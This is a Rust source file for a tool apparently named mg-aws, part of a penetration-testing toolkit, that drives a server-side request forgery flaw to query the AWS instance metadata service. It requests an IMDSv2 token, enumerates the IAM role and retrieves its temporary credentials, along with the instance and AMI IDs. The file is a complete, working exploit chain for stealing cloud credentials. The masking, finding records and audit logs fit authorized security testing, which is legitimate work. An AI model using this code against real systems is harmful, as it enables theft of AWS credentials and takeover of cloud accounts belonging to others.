/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-aws — AWS IMDS credential chain via a confirmed SSRF endpoint.
 * Notes:           --ssrf-url is the SSRF parameter URL. Each metadata URL is
 *                  appended as the value of a "url" query parameter.
 *                  IMDSv2 is attempted first via PUT through the SSRF; falls
 *                  back to v1 if the token PUT fails or returns non-200.
 *                  Sensitive fields (AccessKeyId, SecretAccessKey, Token) are
 *                  masked — only the first 4 characters are shown in output.
 *                  HIGH severity finding is printed if any creds are extracted.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use url::Url;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const IMDS_BASE: &str = "http://169.254.169.254";
const IMDS_TOKEN_PATH: &str = "/latest/api/token";
const IMDS_META_ROOT: &str = "/latest/meta-data/";
const IMDS_IAM_CREDS_PATH: &str = "/latest/meta-data/iam/security-credentials/";
const IMDS_INSTANCE_ID_PATH: &str = "/latest/meta-data/instance-id";
const IMDS_AMI_ID_PATH: &str = "/latest/meta-data/ami-id";
const IMDS_TOKEN_TTL_HEADER: &str = "X-aws-ec2-metadata-token-ttl-seconds";
const IMDS_TOKEN_TTL_VALUE: &str = "21600";
const IMDS_TOKEN_HEADER: &str = "X-aws-ec2-metadata-token";
const OUTPUT_SUBDIR: &str = "aws";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-aws";
const DEFAULT_TIMEOUT_SECS: u64 = 15;
// Number of leading characters to show for masked sensitive fields
const MASK_SHOW_CHARS: usize = 4;
const MASK_SUFFIX: &str = "****";
// ANSI for HIGH finding
const ANSI_RED: &str = "\x1b[31m";
const ANSI_RESET: &str = "\x1b[0m";

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, ValueEnum)]
enum ImdsVersion {
    V1,
    V2,
}

#[derive(Parser, Debug)]
#[command(
    name = "mg-aws",
    about = "AWS IMDS credential extraction via a confirmed SSRF endpoint"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// The SSRF endpoint to proxy requests through (e.g. https://target.com/fetch?url=)
    #[arg(long)]
    ssrf_url: String,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT_SECS)]
    timeout: u64,

    /// IMDS version to try (default: try both, v2 first)
    #[arg(long, value_enum)]
    imds_version: Option<ImdsVersion>,
}

// ── Data types ───────────────────────────────────────────────────────────────

// IAM temporary credentials shape from the metadata service
#[derive(Debug, Deserialize)]
struct IamCredentials {
    #[serde(rename = "AccessKeyId", default)]
    access_key_id: String,
    #[serde(rename = "SecretAccessKey", default)]
    secret_access_key: String,
    #[serde(rename = "Token", default)]
    token: String,
    #[serde(rename = "Expiration", default)]
    expiration: String,
    #[serde(rename = "Type", default)]
    credential_type: String,
}

// Masked version safe for output
#[derive(Debug, Serialize)]
struct MaskedCredentials {
    access_key_id: String,
    secret_access_key: String,
    token: String,
    expiration: String,
    credential_type: String,
}

// Result of one metadata endpoint probe
#[derive(Debug, Serialize)]
struct ProbeStep {
    metadata_url: String,
    ssrf_url_used: String,
    status: u16,
    body_preview: String,
    success: bool,
}

// Top-level output
#[derive(Serialize)]
struct AwsResults {
    engagement: String,
    timestamp: String,
    ssrf_url: String,
    imds_version_used: String,
    confirmed_ssrf: bool,
    role_name: Option<String>,
    credentials: Option<MaskedCredentials>,
    instance_id: Option<String>,
    ami_id: Option<String>,
    steps: Vec<ProbeStep>,
    high_severity: bool,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Mask a sensitive string — show first MASK_SHOW_CHARS then asterisks
fn mask_sensitive(value: &str) -> String {
    if value.len() <= MASK_SHOW_CHARS {
        return MASK_SUFFIX.to_string();
    }
    format!("{}{MASK_SUFFIX}", &value[..MASK_SHOW_CHARS])
}

// Build a complete SSRF-proxied URL by appending the metadata URL to the SSRF base
fn build_ssrf_url(ssrf_base: &str, metadata_path: &str) -> String {
    let meta_url = format!("{IMDS_BASE}{metadata_path}");
    // Append metadata URL as-is; the SSRF base already contains "?url=" or similar
    format!("{ssrf_base}{}", url_encode_simple(&meta_url))
}

// Minimal percent-encoding for embedding a URL as a query parameter value
fn url_encode_simple(s: &str) -> String {
    s.chars()
        .flat_map(|c| match c {
            ' ' => vec!['%', '2', '0'],
            '&' => vec!['%', '2', '6'],
            '#' => vec!['%', '2', '3'],
            ':' => vec!['%', '3', 'A'],
            '/' => vec!['%', '2', 'F'],
            '?' => vec!['%', '3', 'F'],
            '=' => vec!['%', '3', 'D'],
            _ => vec![c],
        })
        .collect()
}

// Validate that the ssrf_url is at least a parseable URL with a scheme
fn validate_ssrf_url(url: &str) -> Result<()> {
    Url::parse(url).with_context(|| format!("invalid --ssrf-url: {url}"))?;
    Ok(())
}

// ── Probe helpers ─────────────────────────────────────────────────────────────

// Send a GET through the SSRF proxy, return (status, body, full URL used)
async fn ssrf_get(
    client: &reqwest::Client,
    ssrf_base: &str,
    metadata_path: &str,
    token: Option<&str>,
) -> (u16, String, String) {
    let full_url = build_ssrf_url(ssrf_base, metadata_path);
    let mut req = client.get(&full_url);
    if let Some(tok) = token {
        req = req.header(IMDS_TOKEN_HEADER, tok);
    }
    match req.send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            (status, body, full_url)
        }
        Err(e) => (0, e.to_string(), full_url),
    }
}

// Attempt to obtain an IMDSv2 token via PUT through the SSRF
// Returns the token string on success
async fn try_imdsv2_token(client: &reqwest::Client, ssrf_base: &str) -> Option<String> {
    let token_ssrf_url = build_ssrf_url(ssrf_base, IMDS_TOKEN_PATH);
    // PUT with the TTL header — if SSRF supports forwarding custom headers
    let resp = client
        .put(&token_ssrf_url)
        .header(IMDS_TOKEN_TTL_HEADER, IMDS_TOKEN_TTL_VALUE)
        .send()
        .await
        .ok()?;
    if resp.status().is_success() {
        let token = resp.text().await.ok()?;
        if !token.trim().is_empty() {
            return Some(token.trim().to_string());
        }
    }
    None
}

// Record a probe step result
fn make_step(metadata_path: &str, full_url: &str, status: u16, body: &str) -> ProbeStep {
    let preview_end = body.len().min(512);
    ProbeStep {
        metadata_url: format!("{IMDS_BASE}{metadata_path}"),
        ssrf_url_used: full_url.to_string(),
        status,
        body_preview: body[..preview_end].to_string(),
        success: status == 200 && !body.trim().is_empty(),
    }
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    validate_ssrf_url(&args.ssrf_url).context("validate SSRF URL")?;

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .user_agent("mg-aws/0.1")
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let mut steps: Vec<ProbeStep> = Vec::new();
    let mut token: Option<String> = None;
    let mut version_used = "v1";

    // Determine which versions to try
    let try_v2 = !matches!(args.imds_version, Some(ImdsVersion::V1));
    let try_v1 = !matches!(args.imds_version, Some(ImdsVersion::V2));

    // Attempt IMDSv2 first unless caller specified v1
    if try_v2 {
        eprintln!("mg-aws: attempting IMDSv2 token via SSRF...");
        token = try_imdsv2_token(&client, &args.ssrf_url).await;
        if token.is_some() {
            version_used = "v2";
            eprintln!("  IMDSv2 token obtained");
        } else {
            eprintln!("  IMDSv2 token failed");
        }
    }

    if token.is_none() && !try_v1 {
        // Caller forced v2 but it failed — still proceed with no token (will likely fail)
        eprintln!("  --imds-version v2 forced but token not obtained; continuing without token");
    }

    if token.is_none() && try_v1 {
        eprintln!("  using IMDSv1 (no token)");
    }

    let tok_ref = token.as_deref();

    // Step 1: Confirm SSRF reaches metadata root
    eprintln!("  probing IMDS root...");
    let (status1, body1, url1) = ssrf_get(&client, &args.ssrf_url, IMDS_META_ROOT, tok_ref).await;
    let confirmed_ssrf = status1 == 200 && !body1.trim().is_empty();
    steps.push(make_step(IMDS_META_ROOT, &url1, status1, &body1));
    eprintln!("  meta-data root: status={status1} confirmed={confirmed_ssrf}");

    // Step 2: Get IAM role name
    let (status2, body2, url2) =
        ssrf_get(&client, &args.ssrf_url, IMDS_IAM_CREDS_PATH, tok_ref).await;
    steps.push(make_step(IMDS_IAM_CREDS_PATH, &url2, status2, &body2));
    let role_name = if status2 == 200 {
        let name = body2.trim().lines().next().unwrap_or("").trim().to_string();
        if name.is_empty() { None } else { Some(name) }
    } else {
        None
    };
    eprintln!("  IAM role: {:?}", role_name);

    // Step 3: Fetch credentials for the role
    let credentials = if let Some(role) = &role_name {
        let creds_path = format!("{IMDS_IAM_CREDS_PATH}{role}");
        eprintln!("  fetching credentials for role {role}...");
        let (status3, body3, url3) = ssrf_get(&client, &args.ssrf_url, &creds_path, tok_ref).await;
        steps.push(make_step(&creds_path, &url3, status3, &body3));
        if status3 == 200 {
            serde_json::from_str::<IamCredentials>(&body3)
                .ok()
                .map(|c| MaskedCredentials {
                    access_key_id: mask_sensitive(&c.access_key_id),
                    secret_access_key: mask_sensitive(&c.secret_access_key),
                    token: mask_sensitive(&c.token),
                    expiration: c.expiration,
                    credential_type: c.credential_type,
                })
        } else {
            None
        }
    } else {
        None
    };

    // Step 4: instance-id
    let (status4, body4, url4) =
        ssrf_get(&client, &args.ssrf_url, IMDS_INSTANCE_ID_PATH, tok_ref).await;
    steps.push(make_step(IMDS_INSTANCE_ID_PATH, &url4, status4, &body4));
    let instance_id = if status4 == 200 {
        let v = body4.trim().to_string();
        if v.is_empty() { None } else { Some(v) }
    } else {
        None
    };

    // Step 5: ami-id
    let (status5, body5, url5) = ssrf_get(&client, &args.ssrf_url, IMDS_AMI_ID_PATH, tok_ref).await;
    steps.push(make_step(IMDS_AMI_ID_PATH, &url5, status5, &body5));
    let ami_id = if status5 == 200 {
        let v = body5.trim().to_string();
        if v.is_empty() { None } else { Some(v) }
    } else {
        None
    };

    let high_severity = credentials.is_some();

    // Print results
    println!("\n=== AWS IMDS Chain via SSRF ===");
    println!("SSRF endpoint: {}", args.ssrf_url);
    println!("IMDS version:  {version_used}");
    println!(
        "SSRF confirmed: {}",
        if confirmed_ssrf { "YES" } else { "NO" }
    );
    if let Some(role) = &role_name {
        println!("IAM Role:      {role}");
    }
    if let Some(creds) = &credentials {
        println!("{ANSI_RED}[HIGH] IAM credentials extracted!{ANSI_RESET}");
        println!("  AccessKeyId:     {}", creds.access_key_id);
        println!("  SecretAccessKey: {}", creds.secret_access_key);
        println!("  Token:           {}", creds.token);
        println!("  Expiration:      {}", creds.expiration);
    }
    if let Some(id) = &instance_id {
        println!("Instance ID:   {id}");
    }
    if let Some(ami) = &ami_id {
        println!("AMI ID:        {ami}");
    }

    // Write HIGH finding when IAM credentials are extracted
    if high_severity {
        let role = role_name.as_deref().unwrap_or("unknown");
        let tf = ToolFinding::new(
            AUDIT_TOOL,
            "AWS IAM Credentials Extracted via SSRF",
            FindingSeverity::High,
        )
        .url(args.ssrf_url.clone())
        .evidence(format!(
            "IAM role={role} credentials obtained via IMDS {version_used}"
        ))
        .recommendation(
            "Require IMDSv2 token-hop-limit=1; restrict outbound SSRF at the application layer",
        );
        let _ = write_finding(&eng, &tf);
    }

    // Write JSON output
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create aws output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = AwsResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        ssrf_url: args.ssrf_url.clone(),
        imds_version_used: version_used.to_string(),
        confirmed_ssrf,
        role_name,
        credentials,
        instance_id,
        ami_id,
        steps,
        high_severity,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Audit log
    let detail = format!("confirmed={confirmed_ssrf} creds={high_severity}");
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mask_sensitive_hides_most_of_string() {
        let masked = mask_sensitive("AKIAIOSFODNN7EXAMPLE");
        assert!(masked.starts_with("AKIA"));
        assert!(masked.contains(MASK_SUFFIX));
        assert!(!masked.contains("IOSFODNN7EXAMPLE"));
    }

    #[test]
    fn mask_sensitive_short_string_returns_suffix() {
        let masked = mask_sensitive("AB");
        assert_eq!(masked, MASK_SUFFIX);
    }

    #[test]
    fn url_encode_simple_encodes_colon_slash() {
        let encoded = url_encode_simple("http://169.254.169.254/latest/");
        assert!(!encoded.contains(':'));
        assert!(!encoded.contains('/'));
        assert!(encoded.contains("%3A"));
        assert!(encoded.contains("%2F"));
    }

    #[test]
    fn build_ssrf_url_appends_encoded_metadata_url() {
        let ssrf_base = "https://target.com/fetch?url=";
        let url = build_ssrf_url(ssrf_base, "/latest/meta-data/");
        assert!(url.starts_with("https://target.com/fetch?url="));
        // Should not contain raw "://"
        let appended = &url["https://target.com/fetch?url=".len()..];
        assert!(!appended.contains("://"));
    }

    #[test]
    fn validate_ssrf_url_accepts_valid_url() {
        assert!(validate_ssrf_url("https://target.com/fetch?url=").is_ok());
        assert!(validate_ssrf_url("http://127.0.0.1:8080/redirect?target=").is_ok());
    }

    #[test]
    fn validate_ssrf_url_rejects_garbage() {
        assert!(validate_ssrf_url("not a url").is_err());
        assert!(validate_ssrf_url("").is_err());
    }

    #[test]
    fn make_step_truncates_body_preview() {
        let long_body = "x".repeat(1000);
        let step = make_step("/test", "https://example.com/", 200, &long_body);
        assert_eq!(step.body_preview.len(), 512);
    }

    #[test]
    fn make_step_success_flag_requires_status_200_and_nonempty() {
        let step_ok = make_step("/test", "https://x.com/", 200, "data");
        assert!(step_ok.success);
        let step_fail = make_step("/test", "https://x.com/", 404, "not found");
        assert!(!step_fail.success);
        let step_empty = make_step("/test", "https://x.com/", 200, "   ");
        assert!(!step_empty.success);
    }
}
